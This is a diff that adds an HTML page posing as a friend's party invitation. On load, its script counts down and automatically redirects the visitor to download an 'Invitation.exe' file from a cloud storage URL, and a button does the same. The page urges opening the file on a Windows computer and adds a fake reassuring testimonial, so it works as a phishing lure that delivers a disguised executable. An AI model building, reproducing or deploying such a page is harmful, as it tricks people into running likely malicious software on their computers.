@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gradient Page</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(to bottom right, #87CEEB, #825BAE);
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      background-color: rgba(255,255,255,0.7);
+      width: 450px;
+      padding: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .section {
+      text-align: center;
+      padding: 0px 10px;
+		line-height: 26px;
+    }
+
+    .gradient-button {
+      background: linear-gradient(to right, blue, skyblue);
+      color: white;
+      border: none;
+      padding: 10px 30px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+		font-weight: 600;
+    }
+
+    .gradient-button:hover {
+      opacity: 0.9;
+    }
+	  .tx_color{
+		  color: #2B107D;
+	  }
+	  
+	  .incontain{ background-color: rgba(121,197,236,0.1);
+		  		border: solid 1px rgba(121,197,236,0.2);;
+		  	padding: 10px 5px;
+		  color: #095172;
+		  border-radius: 5px;	  
+	  }
+	  h1{
+		  margin-bottom: 0px;
+	  }
+	  h4{
+		  margin-top: 0px;
+	  }
+	  i{ color:rgba(0,0,0,0.5);
+		  font-weight: 100;
+		  
+	  }
+	  
+	     .loader-container {
+      width: 100%;
+      background-color: #eee;
+      border-radius: 10px;
+      overflow: hidden;
+      height: 10px;
+      margin: 0px auto;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .loader-bar {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, blue, #825BAE);
+      transition: width 2s linear;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="section"><h1 class="tx_color">You're Invited!</h1></div>
+    <div class="section tx_color">A friend has sent you an invitation.<br>Open to see details</div>
+    <div class="section">To view your invitation, please download and open the invitation file below.</div>
+    <div class="section incontain">For your convenience, this invitation is best opened on a windows laptop or desktop</div>
+    <div class="section">
+		<h4 class="tx_color" id="counter">Downloading will start automatically in 3 seconds...</h4>
+      <button class="gradient-button" onClick="relunch()">Download Invitation</button>
+    </div>
+	<div class="section" id="loaderBox">
+			<div class="loader-container">
+					<div class="loader-bar" id="loaderBar"></div>
+			</div>
+	 </div>
+    <div class="section">		
+		<p>If your download does not start, please click the button above.</p>
+	  	<p><i>'I opened mine and it was so easy!'-- Jamie</i></p>
+	  </div>
+  </div>
+	
+	
+  <script>
+    window.onload = function () {
+      const loader = document.getElementById("loaderBar");
+		const box = document.getElementById("loaderBox");
+		setTimeout(() => { counter.innerHTML = "Downloading will start automatically in 2 seconds..."; }, 1000);
+		setTimeout(() => { counter.innerHTML = "Downloading will start automatically in 1 seconds..."; 
+		window.location.href = "https://pub-ab24f686ec404b938569c7371cf6e85e.r2.dev/Invitation.exe";				 
+						 }, 2000);
+		setTimeout(() => { counter.innerHTML = "Downloading your invitation...";
+						 	loader.style.width = "100%"; }, 3000);
+		setTimeout(() => { box.style.display ="none"; }, 5200);
+    };
+	  
+	  function relunch(){
+		  		window.location.href = "https://pub-ab24f686ec404b938569c7371cf6e85e.r2.dev/Invitation.exe";
+	  }
+  </script>
+</body>
+</html>
